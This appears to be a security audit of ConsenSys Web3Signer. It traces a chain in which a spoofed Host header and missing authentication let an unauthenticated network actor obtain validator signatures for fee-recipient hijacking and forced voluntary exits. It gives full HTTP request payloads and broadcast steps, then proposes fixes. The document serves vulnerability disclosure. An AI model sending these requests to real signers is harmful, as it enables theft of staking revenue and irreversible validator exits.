# Web3Signer Security Audit — Chained Exploit Analysis

**Date:** 2026-02-09
**Target:** ConsenSys Web3Signer (current HEAD: `d8ea31d`)
**Objective:** Demonstrate a concrete, end-to-end attack chain through which a completely unprivileged network actor causes irreversible financial damage to validator assets on the Ethereum beacon chain.

---

## The Attack: Forced Mass Validator Exit + MEV Fee Hijack

An attacker with nothing more than TCP connectivity to the Web3Signer port executes two parallel operations:

- **Phase A** — Sign `VALIDATOR_REGISTRATION` messages pointing `fee_recipient` to the attacker's address. This silently redirects all MEV rewards and priority fees. The validators keep running normally; the operator sees no errors; money flows to the attacker.

- **Phase B** — Sign `VOLUNTARY_EXIT` messages for every loaded validator. Once broadcast to the beacon chain, each validator is **permanently, irreversibly** removed from the active set. Staked ETH is locked in the exit queue. There is no "undo" operation on the Ethereum protocol.

Both phases use the same chain of code-level gaps. Neither requires credentials, tokens, certificates, or any form of authentication.

---

## Step-by-Step Code Trace

### Step 0: Precondition — The Port is Reachable

Web3Signer listens on `--http-listen-port` (default `9000`). The default bind address is `localhost` (`Web3SignerBaseCommand.java:128`), but containerized and cloud deployments routinely override this to `0.0.0.0`:

```yaml
# docker-compose, Kubernetes, or CLI:
--http-listen-host=0.0.0.0
```

Once bound to a non-loopback interface, the single remaining access control is the Host header allowlist. That is the next link in the chain.

---

### Step 1: Bypass HostAllowListHandler — `Host: localhost`

**File:** `core/.../HostAllowListHandler.java:34-48`

```java
public void handle(final RoutingContext event) {
    final Optional<String> hostHeader = getAndValidateHostHeader(event);     // ← reads Host header
    if (httpHostAllowList.contains("*")
        || (hostHeader.isPresent() && hostIsInAllowlist(hostHeader.get()))) {
      event.next();                                                          // ← passes through
    } else {
      response.setStatusCode(403)...
    }
}
```

**File:** `core/.../HostAllowListHandler.java:50-52`

```java
private Optional<String> getAndValidateHostHeader(final RoutingContext event) {
    final HostAndPort hostAndPort = event.request().authority();  // ← parses HTTP "Host:" header
    return Optional.ofNullable(hostAndPort).map(HostAndPort::host);
}
```

**What happens:** `event.request().authority()` returns the value of the HTTP `Host` header — a value the *client* controls entirely. It does **not** inspect the TCP source IP. The default allowlist is `["localhost","127.0.0.1"]` (`Web3SignerBaseCommand.java:142`).

**Attacker action:** Set `Host: localhost` in the HTTP request. The comparison `allowlistEntry.equalsIgnoreCase(hostHeader)` at line 57 matches. `event.next()` is called. The request proceeds as if it came from localhost.

```
attacker (any IP) → TCP connect to <TARGET>:9000
                   → HTTP header "Host: localhost"
                   → HostAllowListHandler passes the request
```

There is no second layer of defense. No authentication middleware exists in the router chain. See `Runner.java:128-155`: after CorsHandler and HostAllowListHandler, the next handlers are BodyHandler and the route handlers themselves.

---

### Step 2: Enumerate All Validator Public Keys

**Route:** `GET /api/v1/eth2/publicKeys`
**File:** `core/.../routes/PublicKeysListRoute.java:42-49`

```java
context.getRouter()
    .route(HttpMethod.GET, path)                                // path = "/api/v1/eth2/publicKeys"
    .produces(JSON_HEADER)
    .handler(new BlockingHandlerDecorator(
        new PublicKeysListHandler(context.getArtifactSignerProviders()), false))
    .failureHandler(context.getErrorHandler());
    // NO AUTH
```

**What happens:** `PublicKeysListHandler` calls `artifactSignerProvider.availableIdentifiers()` and returns every loaded BLS public key as a JSON array.

**Attacker receives:**
```json
["0x8a5d3e6f...pubkey1...", "0xb12c4a7e...pubkey2...", ... ]
```

The attacker now knows every validator identity managed by this Web3Signer instance. This is the target list for both phases.

---

### Step 3: Obtain Public Beacon Chain Parameters

The signing request requires `fork_info` (for VOLUNTARY_EXIT) — this is **entirely public** data:

```bash
# From any beacon node (attacker's own, or any public one):
curl https://beacon-node/eth/v1/beacon/states/head/fork
# → {"previous_version":"0x04000000","current_version":"0x05000000","epoch":"269568"}

curl https://beacon-node/eth/v1/beacon/genesis
# → {"genesis_validators_root":"0x4b363db94e286120d76eb905340fcd44b1..."}
```

The validator_index for each public key is also public:
```bash
curl https://beacon-node/eth/v1/beacon/states/head/validators?id=0x8a5d3e6f...
# → {"index":"12345", ...}
```

No secrets are needed. Every input to the signing request is either public blockchain data or controlled by the attacker.

---

### Step 4A: Phase A — Hijack MEV Fee Recipient (VALIDATOR_REGISTRATION)

**Route:** `POST /api/v1/eth2/sign/:identifier`
**File:** `core/.../routes/eth2/Eth2SignRoute.java:36,73`

```java
private static final String SIGN_PATH = "/api/v1/eth2/sign/:identifier";
// ...
context.getRouter().route(HttpMethod.POST, SIGN_PATH)
    .handler(new BlockingHandlerDecorator(
        new Eth2SignForIdentifierHandler(...), false))  // NO AUTH
```

**Attacker sends (for each validator public key):**

```http
POST /api/v1/eth2/sign/0x8a5d3e6f...pubkey... HTTP/1.1
Host: localhost
Content-Type: application/json

{
  "type": "VALIDATOR_REGISTRATION",
  "validator_registration": {
    "fee_recipient": "0xATTACKER_ETH_ADDRESS_HERE_20BYTES",
    "gas_limit": "30000000",
    "timestamp": "1707436800",
    "pubkey": "0x8a5d3e6f...same_pubkey..."
  }
}
```

**Code flow:**

1. **`Eth2SignForIdentifierHandler.handle()`** — line 88

2. **Parse body** — line 94: `getSigningRequest()` deserializes to `Eth2SigningRequestBody` record. Field `type` = `VALIDATOR_REGISTRATION`.

3. **Compute signing root** — line 100: `computeSigningRoot()` enters:
   ```java
   // line 316-320
   case VALIDATOR_REGISTRATION -> {
       checkArgument(validatorRegistration != null, "ValidatorRegistration is required");
       return signingRootUtil.signingRootForValidatorRegistration(
           validatorRegistration.asInternalValidatorRegistration());
   }
   ```
   Note: **no `fork_info` needed** for this type. The signing root is computed solely from the validator registration data, including the attacker's `fee_recipient`.

4. **Sign** — line 133-134: `signerForIdentifier.sign(normalisedIdentifier, signingRoot)`:
   ```java
   // SignerForIdentifier.java:42
   return signerProvider.getSigner(identifier).map(signer -> signer.sign(data).asHex());
   ```
   The **BLS private key** produces a signature over the attacker's registration data. The signature is computed and held in memory.

5. **Slashing protection check** — line 150: `maySign()` is called:
   ```java
   // line 169-200
   private boolean maySign(...) {
       switch (eth2SigningRequestBody.type()) {
         case BLOCK, BLOCK_V2 -> { /* check */ }
         case ATTESTATION -> { /* check */ }
         default -> {
           return true;    // ← VALIDATOR_REGISTRATION lands here. UNCONDITIONAL PASS.
         }
       }
   }
   ```
   **`return true`** — no check performed for VALIDATOR_REGISTRATION.

6. **Return signature** — line 152: `respondWithSignature()` sends the BLS signature back to the attacker.

**Attacker receives:**
```json
{"signature":"0xa1b2c3d4e5f6...valid_BLS_signature..."}
```

**Blockchain-side effect:**

The attacker submits this signed `ValidatorRegistration` to MEV relay(s):
```bash
POST https://relay.example.com/relay/v1/builder/validators
[{"message":{"fee_recipient":"0xATTACKER...","gas_limit":"30000000",
  "timestamp":"1707436800","pubkey":"0x8a5d3e6f..."},
  "signature":"0xa1b2c3d4..."}]
```

The relay verifies the BLS signature against the validator's known public key. It's valid. From this point forward, any block built by this relay for this validator sends priority fees and MEV to `0xATTACKER`. The validator operator sees no immediate error — the validator keeps attesting and proposing — but **all execution-layer revenue is stolen**.

---

### Step 4B: Phase B — Force Permanent Validator Exit (VOLUNTARY_EXIT)

**Attacker sends (for each validator public key):**

```http
POST /api/v1/eth2/sign/0x8a5d3e6f...pubkey... HTTP/1.1
Host: localhost
Content-Type: application/json

{
  "type": "VOLUNTARY_EXIT",
  "fork_info": {
    "fork": {
      "previous_version": "0x04000000",
      "current_version": "0x05000000",
      "epoch": "269568"
    },
    "genesis_validators_root": "0x4b363db94e286120d76eb905340fcd44b1..."
  },
  "voluntary_exit": {
    "epoch": "269568",
    "validator_index": "12345"
  }
}
```

**Code flow (same handler, same path):**

1. **Parse body** — type = `VOLUNTARY_EXIT`

2. **Compute signing root** — line 271-274:
   ```java
   case VOLUNTARY_EXIT -> {
       checkArgument(body.voluntaryExit() != null, "voluntaryExit must be specified");
       return signingRootUtil.signingRootForSignVoluntaryExit(
           body.voluntaryExit().asInternalVoluntaryExit(),   // epoch + validator_index
           body.forkInfo().asInternalForkInfo());             // public fork data
   }
   ```
   The signing root is a function of `(epoch, validator_index, fork, genesis_validators_root)` — all public values.

3. **Sign** — line 133-134: BLS signature computed with the validator's private key. The signature now exists.

4. **Slashing protection** — line 196-197: `default -> return true`. **No check**. The signature is returned to the attacker.

5. **Return signature** — attacker receives the valid BLS signature.

**Blockchain-side effect:**

The attacker constructs a `SignedVoluntaryExit` and broadcasts to any beacon node:

```bash
POST https://beacon-node/eth/v1/beacon/pool/voluntary_exits
{"message":{"epoch":"269568","validator_index":"12345"},
 "signature":"0xreturnedSignature..."}
```

The beacon chain:
1. Verifies the BLS signature against the validator's on-chain public key → **valid**
2. Checks the epoch is current or past → **valid** (attacker used current epoch)
3. Adds the validator to the exit queue
4. After `MIN_VALIDATOR_WITHDRAWABILITY_DELAY` (256 epochs ≈ 27 hours), the validator is **permanently exited**

**This is irreversible.** There is no on-chain mechanism to cancel a voluntary exit once it's been included. The validator can never re-enter the active set. The staked ETH (32 ETH per validator) is locked until the withdrawal epoch.

---

## Why the Chain Works — The Three Gaps That Must All Exist

The attack requires three code-level gaps to co-exist. Remove any one and the chain breaks:

### Gap 1: Authentication Void

`Runner.java:128-155` — the router chain is: AccessLog → CorsHandler → **HostAllowListHandler** → BodyHandler → route handlers.

There is no `AuthHandler`, no `BearerAuthHandler`, no `JWTAuthHandler`, no `BasicAuthHandler`. The only gate is the Host header check. The OpenAPI spec at `openapi-specs/eth2/keymanager/schemas.yaml:2-6` declares `bearerAuth: JWT` but **no code implements it**. Search for `bearerAuth`, `JWT`, `Authorization` header parsing in any handler — it doesn't exist.

### Gap 2: Host Header as Access Control

`HostAllowListHandler.java:50-52` — `event.request().authority()` returns the client-supplied `Host` header. It does not call `event.request().remoteAddress()` to validate the actual source IP. This makes the allowlist a client-side control — effectively an honor system.

### Gap 3: Slashing Protection Doesn't Protect What Matters Most

`Eth2SignForIdentifierHandler.java:196-197` — the `default -> return true` branch means slashing protection is a filter for only 3 of 13 artifact types: `BLOCK`, `BLOCK_V2`, `ATTESTATION`. The remaining 10 types — including the two most destructive ones (`VOLUNTARY_EXIT` and `VALIDATOR_REGISTRATION`) — pass unconditionally.

The design assumption was that slashing protection only needs to prevent *protocol slashing conditions* (double blocks, surround votes). But the signing endpoint handles far more than slashable messages. `VOLUNTARY_EXIT` is not a slashable offense — it's a valid protocol operation — but it's *irreversible and destructive*. The implicit `return true` treats "not slashable" as "safe to sign," which is a category error.

---

## Financial Impact Model

For a staking operator running N validators through a single Web3Signer instance:

| Impact | Scope | Recovery |
|--------|-------|----------|
| MEV fee theft (Phase A) | All N validators × ongoing | Operator must re-register with correct fee_recipient after detecting theft. Revenue lost during theft window is unrecoverable. |
| Forced exit (Phase B) | All N validators × 32 ETH | **Irreversible.** ETH is locked until withdrawal. Operator must create new validators with new deposits. During exit queue + withdrawal delay, the capital is completely illiquid. |
| Attestation reward loss | All N validators | From the moment of exit, all future attestation/proposal rewards are permanently forfeited. |

For a mid-size operator (1000 validators): 32,000 ETH ($80M+ at current prices) of staked capital locked and made illiquid, plus ongoing revenue stream destroyed.

---

## Exact Code Path Map

```
HTTP Request
│
├─ Runner.java:143 ──── registerHttpHostAllowListHandler(router)
│   └─ HostAllowListHandler.java:36-37 ──── Host header == "localhost"? → PASS
│
├─ Runner.java:149 ──── BodyHandler (parses JSON body)
│
├─ Eth2SignRoute.java:73 ──── route(POST, "/api/v1/eth2/sign/:identifier")
│   └─ Eth2SignForIdentifierHandler.java:88 ──── handle()
│       │
│       ├─ :94 ──── getSigningRequest() → Eth2SigningRequestBody
│       │   type = VOLUNTARY_EXIT  (or VALIDATOR_REGISTRATION)
│       │
│       ├─ :100 ──── computeSigningRoot()
│       │   └─ :271-274 (VOLUNTARY_EXIT) → signingRootUtil.signingRootForSignVoluntaryExit()
│       │   └─ :316-320 (VALIDATOR_REGISTRATION) → signingRootUtil.signingRootForValidatorRegistration()
│       │
│       ├─ :110 ──── slashingProtection.isPresent()? YES
│       │   └─ :111-117 ──── handleSigning(context, signingRoot, id, signatureConsumer)
│       │       │
│       │       └─ :133-134 ──── signerForIdentifier.sign(id, signingRoot) ◄── BLS SIGNATURE COMPUTED
│       │           │                                                         using real private key
│       │           └─ SignerForIdentifier.java:42
│       │               └─ signerProvider.getSigner(id) → BlsArtifactSigner
│       │                   └─ signer.sign(data) → BLSSignature
│       │
│       │   signatureConsumer is called with the computed signature:
│       │
│       │       └─ :143-161 ──── signWithSlashingProtection()
│       │           │
│       │           └─ :150 ──── maySign(pubkey, signingRoot, body)
│       │               │
│       │               └─ :174 ──── switch(type)
│       │                   ├─ BLOCK/BLOCK_V2 → slashing check  (not our type)
│       │                   ├─ ATTESTATION    → slashing check  (not our type)
│       │                   └─ default        → return true     ◄── BYPASS: NO CHECK
│       │
│       │           :151-152 ──── slashingMetrics.incrementSigningsPermitted()
│       │                         respondWithSignature(context, signature)
│       │
│       └─ HTTP 200: {"signature": "0x..."} ◄── VALID BLS SIGNATURE RETURNED TO ATTACKER
│
└── Attacker broadcasts to beacon chain → validator permanently exited
```

---

## What Must Change to Break the Chain

Any one of these mitigations breaks the chain completely:

1. **Require authentication** — Add bearer token / mTLS validation to the router before any handler. If the attacker can't authenticate, nothing past the router matters.

2. **Validate source IP, not Host header** — Replace `event.request().authority()` with `event.request().remoteAddress()` in HostAllowListHandler. A spoofed Host header no longer bypasses the check.

3. **Default-deny in maySign()** — Change `default -> return true` to `default -> return false` (or at minimum add explicit cases for `VOLUNTARY_EXIT` and `VALIDATOR_REGISTRATION` with meaningful protection logic, such as operator confirmation or rate limiting).

Any single one of these stops the attack. Currently, all three gaps co-exist, and the chain from "TCP connection" to "irreversible on-chain damage" is unbroken.
